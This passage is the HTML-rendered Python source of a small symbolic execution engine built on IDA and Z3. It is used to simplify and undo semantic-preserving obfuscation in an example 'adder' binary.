</span><span class='line'>        <span class="n">mnem</span> <span class="o">=</span> <span class="n">GetMnem</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">eip</span><span class="p">)</span>
</span><span class='line'>        <span class="n">x</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'>        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
</span><span class='line'>            <span class="n">ty</span> <span class="o">=</span> <span class="n">GetOpType</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">eip</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
</span><span class='line'>            <span class="c"># cst</span>
</span><span class='line'>            <span class="k">if</span> <span class="mi">5</span> <span class="o">&lt;=</span> <span class="n">ty</span> <span class="o">&lt;=</span> <span class="mi">7</span><span class="p">:</span>
</span><span class='line'>                <span class="n">x</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">GetOperandValue</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">eip</span><span class="p">,</span> <span class="n">i</span><span class="p">))</span>
</span><span class='line'>            <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                <span class="n">x</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">GetOpnd</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">eip</span><span class="p">,</span> <span class="n">i</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">return</span> <span class="p">[</span><span class="n">mnem</span><span class="p">]</span> <span class="o">+</span> <span class="n">x</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">get_next_instruction</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span><span class='line'>        <span class="sd">&#39;&#39;&#39;This is a convenient generator, you can iterator through</span>
</span><span class='line'><span class="sd">        each instructions easily&#39;&#39;&#39;</span>
</span><span class='line'>        <span class="k">while</span> <span class="bp">self</span><span class="o">.</span><span class="n">eip</span> <span class="o">!=</span> <span class="bp">self</span><span class="o">.</span><span class="n">end</span><span class="p">:</span>
</span><span class='line'>            <span class="k">yield</span> <span class="bp">self</span><span class="o">.</span><span class="n">_decode_instr</span><span class="p">()</span>
</span><span class='line'>            <span class="bp">self</span><span class="o">.</span><span class="n">eip</span> <span class="o">+=</span> <span class="n">ItemSize</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">eip</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">class</span> <span class="nc">SymbolicExecutionEngine</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
</span><span class='line'>    <span class="sd">&#39;&#39;&#39;The symbolic execution engine is the class that will</span>
</span><span class='line'><span class="sd">    handle the symbolic execution. It will keep a track of the </span>
</span><span class='line'><span class="sd">    different equations encountered, and the CPU context at each point of the program.</span>
</span><span class='line'>
</span><span class='line'><span class="sd">    The symbolic variables have to be found by the user (or using data-taing). This is not</span>
</span><span class='line'><span class="sd">    the purpose of this class.</span>
</span><span class='line'>
</span><span class='line'><span class="sd">    We are lucky, we only need to handle those operations &amp; encodings:</span>
</span><span class='line'><span class="sd">        . mov:</span>
</span><span class='line'><span class="sd">            . mov reg32, reg32</span>
</span><span class='line'><span class="sd">            . mov reg32, [mem]</span>
</span><span class='line'><span class="sd">            . mov [mem], reg32</span>
</span><span class='line'><span class="sd">            . mov reg32, cst</span>
</span><span class='line'><span class="sd">        . shr:</span>
</span><span class='line'><span class="sd">            . shr reg32, cst</span>
</span><span class='line'><span class="sd">        . shl:</span>
</span><span class='line'><span class="sd">            . shl reg32, cst</span>
</span><span class='line'><span class="sd">        . and:</span>
</span><span class='line'><span class="sd">            . and reg32, cst</span>
</span><span class='line'><span class="sd">            . and reg32, reg32</span>
</span><span class='line'><span class="sd">        . xor:</span>
</span><span class='line'><span class="sd">            . xor reg32, cst</span>
</span><span class='line'><span class="sd">        . or:</span>
</span><span class='line'><span class="sd">            . or reg32, reg32</span>
</span><span class='line'><span class="sd">        . add:</span>
</span><span class='line'><span class="sd">            . add reg32, reg32</span>
</span><span class='line'><span class="sd">            . add reg32, cst</span>
</span><span class='line'>
</span><span class='line'><span class="sd">    We also don&#39;t care about:</span>
</span><span class='line'><span class="sd">        . EFLAGS</span>
</span><span class='line'><span class="sd">        . branches</span>
</span><span class='line'><span class="sd">        . smaller registers (16/8 bits)</span>
</span><span class='line'><span class="sd">    Long story short: it&#39;s perfect ; that environment makes really easy to play with symbolic execution.&#39;&#39;&#39;</span>
</span><span class='line'>    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">):</span>
</span><span class='line'>        <span class="c"># This is the CPU context at each time</span>
</span><span class='line'>        <span class="c"># The value of the registers are index in the equations dictionnary</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span> <span class="o">=</span> <span class="p">{</span>
</span><span class='line'>            <span class="s">&#39;eax&#39;</span> <span class="p">:</span> <span class="bp">None</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;ebx&#39;</span> <span class="p">:</span> <span class="bp">None</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;ecx&#39;</span> <span class="p">:</span> <span class="bp">None</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;edx&#39;</span> <span class="p">:</span> <span class="bp">None</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;esi&#39;</span> <span class="p">:</span> <span class="bp">None</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;edi&#39;</span> <span class="p">:</span> <span class="bp">None</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;ebp&#39;</span> <span class="p">:</span> <span class="bp">None</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;esp&#39;</span> <span class="p">:</span> <span class="bp">None</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;eip&#39;</span> <span class="p">:</span> <span class="bp">None</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># The address where the symbolic execution will start</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">start</span> <span class="o">=</span> <span class="n">start</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># The address where the symbolic execution will stop</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">end</span> <span class="o">=</span> <span class="n">end</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># Our disassembler</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">disass</span> <span class="o">=</span> <span class="n">Disassembler</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># This is the memory that can be used by the instructions to save temporary values/results</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">mem</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># Each equation must have a unique id</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># The symbolic variables will be stored there</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">sym_variables</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># Each equation will be stored here</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">equations</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># Number of instructions emulated</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">ninstrs</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">_check_if_reg32</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">r</span><span class="p">):</span>
</span><span class='line'>        <span class="sd">&#39;&#39;&#39;XXX: make a decorator?&#39;&#39;&#39;</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">_push_equation</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">e</span><span class="p">):</span>
</span><span class='line'>        <span class="n">idx</span> <span class="o">=</span> <span class="n">EquationId</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">idx</span><span class="p">)</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">equations</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">e</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">idx</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">idx</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">set_reg_with_equation</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">r</span><span class="p">,</span> <span class="n">e</span><span class="p">):</span>
</span><span class='line'>        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">_check_if_reg32</span><span class="p">(</span><span class="n">r</span><span class="p">)</span> <span class="o">==</span> <span class="bp">False</span><span class="p">:</span>
</span><span class='line'>            <span class="k">return</span>
</span><span class='line'>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">[</span><span class="n">r</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_push_equation</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">get_reg_equation</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">r</span><span class="p">):</span>
</span><span class='line'>        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">_check_if_reg32</span><span class="p">(</span><span class="n">r</span><span class="p">)</span> <span class="o">==</span> <span class="bp">False</span><span class="p">:</span>
</span><span class='line'>            <span class="k">return</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">[</span><span class="n">r</span><span class="p">],</span> <span class="n">EquationId</span><span class="p">):</span>
</span><span class='line'>            <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">equations</span><span class="p">[</span><span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">[</span><span class="n">r</span><span class="p">]]</span>
</span><span class='line'>        <span class="k">else</span><span class="p">:</span>
</span><span class='line'>            <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">[</span><span class="n">r</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span><span class='line'>        <span class="sd">&#39;&#39;&#39;Run from start address to end address the engine&#39;&#39;&#39;</span>
</span><span class='line'>        <span class="k">for</span> <span class="n">mnemonic</span><span class="p">,</span> <span class="n">dst</span><span class="p">,</span> <span class="n">src</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">disass</span><span class="o">.</span><span class="n">get_next_instruction</span><span class="p">():</span>
</span><span class='line'>            <span class="k">if</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">ninstrs</span> <span class="o">%</span> <span class="mi">5000</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="ow">and</span> <span class="bp">self</span><span class="o">.</span><span class="n">ninstrs</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>                <span class="k">print</span> <span class="s">&#39;</span><span class="si">%d</span><span class="s"> instructions, </span><span class="si">%d</span><span class="s"> equations so far...&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">ninstrs</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">equations</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>            <span class="k">if</span> <span class="n">mnemonic</span> <span class="o">==</span> <span class="s">&#39;mov&#39;</span><span class="p">:</span>
</span><span class='line'>                <span class="c"># mov reg32, imm32</span>
</span><span class='line'>                <span class="k">if</span> <span class="n">dst</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span> <span class="ow">and</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="p">(</span><span class="nb">int</span><span class="p">,</span> <span class="nb">long</span><span class="p">)):</span>
</span><span class='line'>                    <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">[</span><span class="n">dst</span><span class="p">]</span> <span class="o">=</span> <span class="n">src</span>
</span><span class='line'>                <span class="c"># mov reg32, reg32</span>
</span><span class='line'>                <span class="k">elif</span> <span class="n">src</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span> <span class="ow">and</span> <span class="n">dst</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">:</span>
</span><span class='line'>                    <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">[</span><span class="n">dst</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">[</span><span class="n">src</span><span class="p">]</span>
</span><span class='line'>                <span class="c"># mov reg32, [mem]</span>
</span><span class='line'>                <span class="k">elif</span> <span class="p">(</span><span class="n">src</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s">&#39;var_&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="ow">or</span> <span class="n">src</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s">&#39;arg&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="ow">and</span> <span class="n">dst</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">:</span>
</span><span class='line'>                    <span class="k">if</span> <span class="n">src</span> <span class="ow">not</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">mem</span><span class="p">:</span>
</span><span class='line'>                        <span class="c"># A non-initialized location is trying to be read, we got a symbolic variable!</span>
</span><span class='line'>                        <span class="n">sym</span> <span class="o">=</span> <span class="n">BitVec</span><span class="p">(</span><span class="s">&#39;arg</span><span class="si">%d</span><span class="s">&#39;</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">sym_variables</span><span class="p">),</span> <span class="mi">32</span><span class="p">)</span>
</span><span class='line'>                        <span class="bp">self</span><span class="o">.</span><span class="n">sym_variables</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">sym</span><span class="p">)</span>
</span><span class='line'>                        <span class="k">print</span> <span class="s">&#39;Trying to read a non-initialized area, we got a new symbolic variable: </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">sym</span>
</span><span class='line'>                        <span class="bp">self</span><span class="o">.</span><span class="n">mem</span><span class="p">[</span><span class="n">src</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_push_equation</span><span class="p">(</span><span class="n">sym</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>                    <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">[</span><span class="n">dst</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">mem</span><span class="p">[</span><span class="n">src</span><span class="p">]</span>
</span><span class='line'>                <span class="c"># mov [mem], reg32</span>
</span><span class='line'>                <span class="k">elif</span> <span class="n">dst</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s">&#39;var_&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="ow">and</span> <span class="n">src</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">:</span>
</span><span class='line'>                    <span class="bp">self</span><span class="o">.</span><span class="n">mem</span><span class="p">[</span><span class="n">dst</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">[</span><span class="n">src</span><span class="p">]</span>
</span><span class='line'>                <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                    <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&#39;This encoding of &quot;mov&quot; is not handled.&#39;</span><span class="p">)</span>
</span><span class='line'>            <span class="k">elif</span> <span class="n">mnemonic</span> <span class="o">==</span> <span class="s">&#39;shr&#39;</span><span class="p">:</span>
</span><span class='line'>                <span class="c"># shr reg32, cst</span>
</span><span class='line'>                <span class="k">if</span> <span class="n">dst</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span> <span class="ow">and</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="p">(</span><span class="nb">int</span><span class="p">,</span> <span class="nb">long</span><span class="p">)):</span>
</span><span class='line'>                    <span class="bp">self</span><span class="o">.</span><span class="n">set_reg_with_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_reg_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="n">src</span><span class="p">)</span>
</span><span class='line'>                <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                    <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&#39;This encoding of &quot;shr&quot; is not handled.&#39;</span><span class="p">)</span>
</span><span class='line'>            <span class="k">elif</span> <span class="n">mnemonic</span> <span class="o">==</span> <span class="s">&#39;shl&#39;</span><span class="p">:</span>
</span><span class='line'>                <span class="c"># shl reg32, cst</span>
</span><span class='line'>                <span class="k">if</span> <span class="n">dst</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span> <span class="ow">and</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="p">(</span><span class="nb">int</span><span class="p">,</span> <span class="nb">long</span><span class="p">)):</span>
</span><span class='line'>                    <span class="bp">self</span><span class="o">.</span><span class="n">set_reg_with_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_reg_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="n">src</span><span class="p">)</span>
</span><span class='line'>                <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                    <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&#39;This encoding of &quot;shl&quot; is not handled.&#39;</span><span class="p">)</span>
</span><span class='line'>            <span class="k">elif</span> <span class="n">mnemonic</span> <span class="o">==</span> <span class="s">&#39;and&#39;</span><span class="p">:</span>
</span><span class='line'>                <span class="c"># and reg32, cst</span>
</span><span class='line'>                <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="p">(</span><span class="nb">int</span><span class="p">,</span> <span class="nb">long</span><span class="p">)):</span>
</span><span class='line'>                    <span class="n">x</span> <span class="o">=</span> <span class="n">src</span>
</span><span class='line'>                <span class="c"># and reg32, reg32</span>
</span><span class='line'>                <span class="k">elif</span> <span class="n">src</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">:</span>
</span><span class='line'>                    <span class="n">x</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_reg_equation</span><span class="p">(</span><span class="n">src</span><span class="p">)</span>
</span><span class='line'>                <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                    <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&#39;This encoding of &quot;and&quot; is not handled.&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>                <span class="bp">self</span><span class="o">.</span><span class="n">set_reg_with_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_reg_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>            <span class="k">elif</span> <span class="n">mnemonic</span> <span class="o">==</span> <span class="s">&#39;xor&#39;</span><span class="p">:</span>
</span><span class='line'>                <span class="c"># xor reg32, cst</span>
</span><span class='line'>                <span class="k">if</span> <span class="n">dst</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span> <span class="ow">and</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="p">(</span><span class="nb">int</span><span class="p">,</span> <span class="nb">long</span><span class="p">)):</span>
</span><span class='line'>                    <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">[</span><span class="n">dst</span><span class="p">]</span> <span class="ow">not</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">equations</span><span class="p">:</span>
</span><span class='line'>                        <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">[</span><span class="n">dst</span><span class="p">]</span> <span class="o">^=</span> <span class="n">src</span>
</span><span class='line'>                    <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                        <span class="bp">self</span><span class="o">.</span><span class="n">set_reg_with_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_reg_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">)</span> <span class="o">^</span> <span class="n">src</span><span class="p">)</span>
</span><span class='line'>                <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                    <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&#39;This encoding of &quot;xor&quot; is not handled.&#39;</span><span class="p">)</span>
</span><span class='line'>            <span class="k">elif</span> <span class="n">mnemonic</span> <span class="o">==</span> <span class="s">&#39;or&#39;</span><span class="p">:</span>
</span><span class='line'>                <span class="c"># or reg32, reg32</span>
</span><span class='line'>                <span class="k">if</span> <span class="n">dst</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span> <span class="ow">and</span> <span class="n">src</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">:</span>
</span><span class='line'>                    <span class="bp">self</span><span class="o">.</span><span class="n">set_reg_with_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_reg_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">)</span> <span class="o">|</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_reg_equation</span><span class="p">(</span><span class="n">src</span><span class="p">))</span>
</span><span class='line'>                <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                    <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&#39;This encoding of &quot;or&quot; is not handled.&#39;</span><span class="p">)</span>
</span><span class='line'>            <span class="k">elif</span> <span class="n">mnemonic</span> <span class="o">==</span> <span class="s">&#39;add&#39;</span><span class="p">:</span>
</span><span class='line'>                <span class="c"># add reg32, reg32</span>
</span><span class='line'>                <span class="k">if</span> <span class="n">dst</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span> <span class="ow">and</span> <span class="n">src</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">:</span>
</span><span class='line'>                    <span class="bp">self</span><span class="o">.</span><span class="n">set_reg_with_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_reg_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">)</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_reg_equation</span><span class="p">(</span><span class="n">src</span><span class="p">))</span>
</span><span class='line'>                <span class="c"># add reg32, cst</span>
</span><span class='line'>                <span class="k">elif</span> <span class="n">dst</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span> <span class="ow">and</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="p">(</span><span class="nb">int</span><span class="p">,</span> <span class="nb">long</span><span class="p">)):</span>
</span><span class='line'>                    <span class="bp">self</span><span class="o">.</span><span class="n">set_reg_with_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_reg_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">)</span> <span class="o">+</span> <span class="n">src</span><span class="p">)</span>
</span><span class='line'>                <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                    <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&#39;This encoding of &quot;add&quot; is not handled.&#39;</span><span class="p">)</span>
</span><span class='line'>            <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                <span class="k">print</span> <span class="n">mnemonic</span><span class="p">,</span> <span class="n">dst</span><span class="p">,</span> <span class="n">src</span>
</span><span class='line'>                <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&#39;This instruction is not handled.&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>            <span class="bp">self</span><span class="o">.</span><span class="n">ninstrs</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">_simplify_additions</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">eq</span><span class="p">):</span>
</span><span class='line'>        <span class="sd">&#39;&#39;&#39;The idea in this function is to help Z3 to simplify our big bitvec-arithmetic</span>
</span><span class='line'><span class="sd">        expression. It&#39;s simple, in eq we have a big expression with two symbolic variables (arg0 &amp; arg1)</span>
</span><span class='line'><span class="sd">        and a lot of bitvec arithmetic. Somehow, the simplify function is not clever enough to reduce the</span>
</span><span class='line'><span class="sd">        equation.</span>
</span><span class='line'>
</span><span class='line'><span class="sd">        The idea here is to use the prove function in order to see if we can simplify an equation by an addition of the</span>
</span><span class='line'><span class="sd">        symbolic variables.&#39;&#39;&#39;</span>
</span><span class='line'>        <span class="c"># The two expressions are equivalent ; we got a simplification!</span>
</span><span class='line'>        <span class="k">if</span> <span class="n">prove_</span><span class="p">(</span><span class="n">Sum</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">sym_variables</span><span class="p">)</span> <span class="o">==</span> <span class="n">eq</span><span class="p">):</span>
</span><span class='line'>            <span class="k">return</span> <span class="n">Sum</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">sym_variables</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">return</span> <span class="n">eq</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">get_reg_equation_simplified</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">reg</span><span class="p">):</span>
</span><span class='line'>        <span class="n">eq</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_reg_equation</span><span class="p">(</span><span class="n">reg</span><span class="p">)</span>
</span><span class='line'>        <span class="n">eq</span> <span class="o">=</span> <span class="n">simplify</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">_simplify_additions</span><span class="p">(</span><span class="n">eq</span><span class="p">))</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">eq</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span><span class='line'>    <span class="sd">&#39;&#39;&#39;Here we will try to attack the semantic-preserving obfuscations</span>
</span><span class='line'><span class="sd">    I talked about in &quot;Obfuscation of steel: meet my Kryptonite.&quot; : http://0vercl0k.tuxfamily.org/bl0g/?p=260.</span>
</span><span class='line'>
</span><span class='line'><span class="sd">    The idea is to defeat those obfuscations using a tiny symbolic execution engine.&#39;&#39;&#39;</span>
</span><span class='line'>    <span class="c"># sym = SymbolicExecutionEngine(0x804845A, 0x0804A17C) # for simple adder</span>
</span><span class='line'>    <span class="n">sym</span> <span class="o">=</span> <span class="n">SymbolicExecutionEngine</span><span class="p">(</span><span class="mh">0x804823C</span><span class="p">,</span> <span class="mh">0x08072284</span><span class="p">)</span> <span class="c"># adder kryptonized</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;Launching the engine..&#39;</span>
</span><span class='line'>    <span class="n">sym</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;Done. </span><span class="si">%d</span><span class="s"> equations built, </span><span class="si">%d</span><span class="s"> assembly lines emulated, </span><span class="si">%d</span><span class="s"> virtual memory cells used&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sym</span><span class="o">.</span><span class="n">equations</span><span class="p">),</span> <span class="n">sym</span><span class="o">.</span><span class="n">ninstrs</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">sym</span><span class="o">.</span><span class="n">mem</span><span class="p">))</span>
